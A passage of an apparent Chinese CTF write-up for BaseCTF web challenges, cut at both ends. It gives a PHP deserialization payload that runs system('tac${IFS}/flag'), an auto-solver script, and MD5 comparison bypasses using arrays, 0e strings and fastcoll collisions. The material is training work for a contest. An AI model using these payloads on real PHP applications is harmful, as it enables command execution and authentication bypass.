variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$tmp</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"word"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"%00Shark%00word"</span><span class="token punctuation">,</span> <span class="token variable">$tmp</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 不要忘记修改前面的数字</span><span class="token variable">$tmp</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cmd"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"%00Sink%00cmd"</span><span class="token punctuation">,</span> <span class="token variable">$tmp</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$tmp</span><span class="token punctuation">;</span></span></code></pre><p>Payload:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">POST</span><span class="token punctuation">:</span>nature<span class="token operator">=</span><span class="token constant">O</span><span class="token operator">%</span><span class="token number">3</span>A6<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Nature<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A3<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>sea<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A3<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Sea<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A6<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>animal<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A5<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Shark<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A11<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span>Shark<span class="token operator">%</span><span class="token number">00</span>word<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Sink<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A9<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span>Sink<span class="token operator">%</span><span class="token number">00</span>cmd<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A25<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>system<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">27</span>tac<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">7</span>BIFS<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">2</span>Fflag<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>D</code></pre><p>值得一提的是因为Shark中的word和Sink的cmd为私有变量，所以要手动改变其url编码后的结果</p><pre class="language-php" data-language="php"><code class="language-php">cmd <span class="token operator">--</span><span class="token operator">></span> <span class="token operator">%</span><span class="token number">00</span>Sink<span class="token operator">%</span><span class="token number">00</span>cmd  s<span class="token punctuation">:</span><span class="token number">3</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token property">s</span><span class="token punctuation">:</span><span class="token number">9</span></code></pre><h4 id="数学大师"><a href="#数学大师" class="headerlink" title="数学大师"></a>数学大师</h4><p>脚本题，注意除法取整而且要替换一下乘号和除号</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoup<span class="token keyword">import</span> re<span class="token keyword">import</span> ast<span class="token keyword">def</span> <span class="token function">safe_eval</span><span class="token punctuation">(</span>expression<span class="token punctuation">)</span><span class="token punctuation">:</span>    node <span class="token operator">=</span> ast<span class="token punctuation">.</span>parse<span class="token punctuation">(</span>expression<span class="token punctuation">,</span> mode<span class="token operator">=</span><span class="token string">'eval'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token builtin">compile</span><span class="token punctuation">(</span>node<span class="token punctuation">,</span> <span class="token string">'&lt;string>'</span><span class="token punctuation">,</span> <span class="token string">'eval'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"__builtins__"</span><span class="token punctuation">:</span> <span class="token boolean">None</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>url <span class="token operator">=</span> <span class="token string">"http://challenge.basectf.fun:27436/"</span>headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"application/x-www-form-urlencoded"</span><span class="token punctuation">,</span>    <span class="token string">"Accept"</span><span class="token punctuation">:</span> <span class="token string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"</span><span class="token punctuation">,</span>    <span class="token string">"user-agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0"</span><span class="token punctuation">&#125;</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>response <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    soup <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">,</span> <span class="token string">"lxml"</span><span class="token punctuation">)</span>    key_text <span class="token operator">=</span> soup<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'body'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text    <span class="token keyword">match</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'\d+[+\-×÷]\d+'</span><span class="token punctuation">,</span> key_text<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">match</span><span class="token punctuation">:</span>        calculation <span class="token operator">=</span> <span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>calculation<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'÷'</span> <span class="token keyword">in</span> calculation<span class="token punctuation">:</span>            calculation <span class="token operator">=</span> calculation<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'÷'</span><span class="token punctuation">,</span> <span class="token string">'//'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'×'</span> <span class="token keyword">in</span> calculation<span class="token punctuation">:</span>            calculation <span class="token operator">=</span> calculation<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'×'</span><span class="token punctuation">,</span> <span class="token string">'*'</span><span class="token punctuation">)</span>        result <span class="token operator">=</span> safe_eval<span class="token punctuation">(</span>calculation<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>calculation<span class="token punctuation">&#125;</span></span><span class="token string">=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>result<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>        post_data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"answer"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>result<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">&#125;</span>        response <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>post_data<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'CTF'</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">match</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'BaseCTF(.*)'</span><span class="token punctuation">,</span> response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token keyword">match</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token format-spec">-6]</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>                exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></code></pre><h4 id="所以你说你懂-MD5-哈希长度拓展攻击"><a href="#所以你说你懂-MD5-哈希长度拓展攻击" class="headerlink" title="所以你说你懂 MD5?  (哈希长度拓展攻击)"></a>所以你说你懂 MD5?  (哈希长度拓展攻击)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 所以你说你懂 MD5 了?</span><span class="token variable">$apple</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'apple'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$banana</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'banana'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$apple</span> <span class="token operator">!==</span> <span class="token variable">$banana</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$apple</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$banana</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'加强难度就不会了?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 什么? 你绕过去了?</span><span class="token comment">// 加大剂量!</span><span class="token comment">// 我要让他成为 string</span><span class="token variable">$apple</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'appple'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$banana</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'bananana'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$apple</span> <span class="token operator">!==</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$banana</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$apple</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$banana</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'难吗?不难!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 你还是绕过去了?</span><span class="token comment">// 哦哦哦, 我少了一个等于号</span><span class="token variable">$apple</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'apppple'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$banana</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'banananana'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$apple</span> <span class="token operator">!==</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$banana</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$apple</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$banana</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'嘻嘻, 不会了? 没看直播回放?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 你以为这就结束了</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'random'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'random'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">random_bytes</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">random_bytes</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">random_bytes</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 你想看到 random 的值吗?</span><span class="token comment">// 你不是很懂 MD5 吗? 那我就告诉你他的 MD5 吧</span><span class="token variable">$random</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'random'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$random</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br />'</span><span class="token punctuation">;</span><span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span> <span class="token operator">??</span> <span class="token string single-quoted-string">'user'</span><span class="token punctuation">;</span><span class="token comment">// check if name ends with 'admin'</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'不是管理员也来凑热闹?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$md5</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'md5'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$random</span> <span class="token operator">.</span> <span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token variable">$md5</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'伪造? NO NO NO!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 认输了, 看样子你真的很懂 MD5</span><span class="token comment">// 那 flag 就给你吧</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"看样子你真的很懂 MD5"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 加强难度就不会了<span class="token operator">?</span></span></code></pre><p>第一层可用数组绕过</p><pre class="language-php" data-language="php"><code class="language-php">apple<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>banana<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">2</span></code></pre><p>第二层转化为了<code>string</code>，此时数组会变成<code>array</code>无法绕过，可以利用后面的弱比较，让0e开头的字符串误以为科学计数法，转化为0</p><pre class="language-php" data-language="php"><code class="language-php">appple<span class="token operator">=</span><span class="token constant">QNKCDZO</span><span class="token operator">&amp;</span>banananana<span class="token operator">=</span><span class="token constant">QLTHNDT</span> </code></pre><p>第三层变成了强比较，可以使用fastcoll工具来得到一些MD5真实相等的值</p><p>先随便创建一个txt文件，然后将文件拖入<code>fastcoll</code>中得到两个MD5值相等的文件，然后使用php得出MD5值相等的俩字符串</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">function</span> <span class="token function-definition function">readmyfile</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token variable">$fh</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$fh</span><span class="token punctuation">,</span> <span class="token function">filesize</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fh</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">return</span> <span class="token variable">$data</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">readmyfile</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"D:\CTF\Tool\\fastcoll_v1.0.0.5.exe\drafr_msg1.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">readmyfile</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"D:\CTF\Tool\\fastcoll_v1.0.0.5.exe\drafr_msg2.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php">apppple<span class="token operator">=</span>hsad<span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token constant">C0</span><span class="token operator">%</span><span class="token constant">E9</span><span class="token operator">%</span><span class="token constant">CC</span><span class="token operator">%</span><span class="token constant">C5</span><span class="token operator">%</span><span class="token number">03</span><span class="token operator">%</span><span class="token number">0</span>E<span class="token operator">%</span><span class="token number">0</span>E<span class="token operator">%</span><span class="token constant">D4</span><span class="token operator">%</span><span class="token number">5</span>D<span class="token operator">%</span><span class="token constant">BB</span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token constant">B1</span><span class="token operator">%</span><span class="token constant">E4</span><span class="token operator">%</span><span class="token constant">AB</span><span class="token operator">%</span><span class="token constant">C0</span><span class="token operator">%</span><span class="token number">23</span>Vg<span class="token operator">%</span><span class="token number">22</span>u<span class="token operator">%</span><span class="token number">05</span><span class="token operator">%</span><span class="token number">95</span>Z<span class="token operator">%</span><span class="token number">1</span>B<span class="token operator">%</span><span class="token constant">CA</span><span class="token operator">%</span><span class="token number">80</span><span class="token operator">%</span><span class="token number">8</span>DS<span class="token operator">%</span><span class="token number">0</span>A<span class="token operator">%</span><span class="token number">92</span><span class="token operator">%</span><span class="token constant">EC</span><span class="token operator">%</span><span class="token constant">BC</span><span class="token operator">%</span><span class="token constant">A3</span><span class="token operator">%</span><span class="token number">08</span><span class="token operator">%</span><span class="token constant">F2</span><span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span>EDf<span class="token operator">%</span><span class="token constant">FA</span><span class="token operator">%</span><span class="token constant">EB</span><span class="token operator">-</span>ha<span class="token operator">%</span><span class="token number">88</span><span class="token operator">%</span><span class="token constant">D3</span><span class="token operator">%</span><span class="token number">98</span><span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">95</span>E<span class="token operator">%</span><span class="token constant">F6</span><span class="token operator">%</span><span class="token constant">A1</span><span class="token operator">%</span><span class="token number">1</span>B<span class="token operator">%</span><span class="token number">5</span>B<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">21</span>y<span class="token operator">%</span><span class="token constant">A5</span><span class="token operator">%</span><span class="token number">12</span>f<span class="token operator">%</span><span class="token constant">B5H</span><span class="token operator">%</span><span class="token constant">F9</span><span class="token operator">%</span><span class="token number">3</span>C<span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span>F7Lci<span class="token operator">%</span><span class="token number">8</span>Dg<span class="token operator">%</span><span class="token constant">FC</span><span class="token operator">%</span><span class="token number">7</span>B8y<span class="token operator">%</span><span class="token constant">CD</span><span class="token operator">%</span><span class="token constant">A3</span><span class="token operator">%</span><span class="token number">8</span>E<span class="token operator">%</span><span class="token constant">E4</span><span class="token operator">%</span><span class="token constant">E7</span><span class="token operator">%</span><span class="token constant">D5</span><span class="token operator">%</span><span class="token number">0</span>F<span class="token operator">%</span><span class="token number">5</span>EI<span class="token operator">%</span><span class="token number">13</span><span class="token operator">%</span>C8n<span class="token operator">%</span><span class="token number">8</span>A<span class="token operator">%</span><span class="token number">86</span><span class="token operator">%</span><span class="token constant">F9</span><span class="token operator">%</span><span class="token number">9</span>FK_a<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span>C1h<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token constant">B5</span><span class="token operator">%</span><span class="token number">0</span>Atg<span class="token operator">%</span><span class="token number">93</span><span class="token operator">%</span><span class="token number">5</span>E<span class="token operator">%</span><span class="token 